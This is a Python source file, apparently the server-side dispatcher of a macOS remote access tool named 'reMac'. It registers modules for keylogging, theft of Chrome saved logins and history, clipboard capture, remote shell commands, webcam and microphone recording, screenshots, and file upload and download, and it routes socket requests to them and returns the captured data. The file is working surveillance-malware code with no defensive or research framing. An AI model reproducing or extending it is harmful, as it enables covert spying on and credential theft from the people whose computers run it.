import sys

from apps.server.modules import mod_clipboard, mod_keylogger, mod_hello, mod_chrome_logins, mod_chrome_history
from apps.server.modules import mod_shellcmd, mod_screenshot, mod_webcam, mod_recmic, mod_modHelp, mod_info
from apps.server.modules import mod_download, mod_upload, mod_help, mod_video, mod_system_profiler

from apps.libs.reMac_libbase import reMac_libbase

reMacModules = [
    mod_hello.mod_hello(),
    mod_clipboard.mod_clipboard(),
    mod_chrome_history.mod_chrome_history(),
    mod_chrome_logins.mod_chrome_logins(),
    mod_shellcmd.mod_shellcmd(),
    mod_screenshot.mod_screenshot(),
    mod_webcam.mod_webcam(),
    mod_keylogger.mod_keylogger(),
    mod_recmic.mod_recmic(),
    mod_modHelp.mod_modHelp(),
    mod_info.mod_info(),
    mod_download.mod_download(),
    mod_upload.mod_upload(),
    mod_video.mod_video(),
    mod_help.mod_help(),
    mod_system_profiler.mod_system_profiler()
]

class reMac_libserver(reMac_libbase):
    def __init__(self, selector, sock, addr):
        reMac_libbase.__init__(self, selector, sock, addr)
        self._recv_buffer = b""
        self._send_buffer = b""
        self._jsonheader_len = None
        self.jsonheader = None
        self.request = None
        self.response_created = False

    def _read(self):
        try:
            # Should be ready to read
            data = self.sock.recv(4096)
        except BlockingIOError:
            # Resource temporarily unavailable (errno EWOULDBLOCK)
            pass
        else:
            if data:
                self._recv_buffer += data
            else:
                raise RuntimeError("Peer closed.")

    def _write(self):
        if self._send_buffer:
            # print("sending", repr(self._send_buffer), "to", self.addr)
            try:
                # Should be ready to write
                sent = self.sock.send(self._send_buffer)
            except BlockingIOError:
                # Resource temporarily unavailable (errno EWOULDBLOCK)
                pass
            else:
                self._send_buffer = self._send_buffer[sent:]
                # Close when the buffer is drained. The response has been sent.
                if sent and not self._send_buffer:
                    self.close()

    def getModule4Cmd(self, cmd):
        for mod in reMacModules:
            # print(f'{mod.cmd_short}, {mod.cmd_long}, {mod.cmd_desc}')
            if mod.cmd_short == cmd or mod.cmd_long == cmd:
                return mod
        return None

    def processInput(self, input, value = ""):

        # for mod in reMacModules:
        #     print(f'{mod.cmd_short}, {mod.cmd_long}, {mod.cmd_desc}')

        if input == "q":
            sys.exit(1)

        if input.startswith("mh"):
            for mod in reMacModules:
                if mod.cmd_short == input:
                    return mod.print_client_help("reMac", reMacModules, value)
        else:
            mod = self.getModule4Cmd(input)
            if mod is not None:
                return mod.run_mod(input, value)
        # elif input == "h":
        #     # print_help()
        #     pass
        # elif input == "hw" \
        #         or input == "ch" \
        #         or input == "vd" \
        #         or input == "cl" \
        #         or input == "wc" \
        #         or input == "hp":
        #     for mod in reMacModules:
        #         if mod.cmd_short == input:
        #             return mod.run_mod()
        # elif input == "dl" \
        #         or input == "ul" \
        #         or input == "in" \
        #         or input == "cb" \
        #         or input == "rm" \
        #         or input == "sc":
        #     for mod in reMacModules:
        #         if mod.cmd_short == input:
        #             return mod.run_mod(input, value)
        # elif input == "sh":
        #     for mod in reMacModules:
        #         if mod.cmd_short == input:
        #             if mod.running == True:
        #                 mod.command = value
        #                 break
        #             else:
        #                 return mod.run_cmd(input, value)
        # elif input.startswith("mh"):
        #     for mod in reMacModules:
        #         if mod.cmd_short == input:
        #             return mod.print_client_help("reMac", reMacModules, value)
        # else:
        print(f"Command '{input}' NOT FOUND! Check the following command list")

    def _create_response_json_content(self):
        action = self.request.get("action")
        value = self.request.get("value")

        mod = self.getModule4Cmd(action)
        if mod is not None:
        # if action == "hw" \
        #         or action == "cb" \
        #         or action == "vd" \
        #         or action == "ch" \
        #         or action == "cl" \
        #         or action == "sh" \
        #         or action == "sc" \
        #         or action == "wc" \
        #         or action == "rm" \
        #         or action == "in" \
        #         or action == "dl" \
        #         or action == "hp" \
        #         or action.startswith("mh"):
            answer = self.processInput(action, value)
            if action == "dl":
                filename = value.split("/")
                content = {"action": action, "result": answer, "filename": filename[len(filename)-1]}
            else:
                content = {"action": action, "result": answer}
        elif action == "ul":
            answer = self.processInput(action, value)
            content = {"action": action, "result": answer}
        else:
            content = {"action": action, "result": f'Error: invalid action "{action}".'}
        content_encoding = "utf-8"
        response = {
            "content_bytes": self._json_encode(content, content_encoding),
            "content_type": "text/json",
            "content_encoding": content_encoding,
        }
        return response

    def _create_response_binary_content(self):
        response = {
            "content_bytes": b"First 10 bytes of request: "
            + self.request[:10],
            "content_type": "binary/custom-server-binary-type",
            "content_encoding": "binary",
        }
        return response

    def read(self):
        sret = ""
        self._read()

        if self._jsonheader_len is None:
            self.process_protoheader()

        if self._jsonheader_len is not None:
            if self.jsonheader is None:
                self.process_jsonheader()

        if self.jsonheader:
            if self.request is None:
                sret = self.process_request()
        return sret

    def write(self):
        if self.request:
            if not self.response_created:
                self.create_response()

        self._write()

    def process_request(self):
        sret = ""
        content_len = self.jsonheader["content-length"]
        if not len(self._recv_buffer) >= content_len:
            return sret
        data = self._recv_buffer[:content_len]
        self._recv_buffer = self._recv_buffer[content_len:]
        if self.jsonheader["content-type"] == "text/json":
            encoding = self.jsonheader["content-encoding"]
            self.request = self._json_decode(data, encoding)
            sret = f"received request {repr(self.request)} from {self.addr}"
            # print(sret)
        else:
            # Binary or unknown content-type
            self.request = data
            print(
                f'received {self.jsonheader["content-type"]} request from',
                self.addr,
            )
        # Set selector to listen for write events, we're done reading.
        self._set_selector_events_mask("w")
        return sret

    def create_response(self):
        if self.jsonheader["content-type"] == "text/json":
            response = self._create_response_json_content()
        else:
            # Binary or unknown content-type
            response = self._create_response_binary_content()
        message = self._create_message(**response)
        self.response_created = True
        self._send_buffer += message
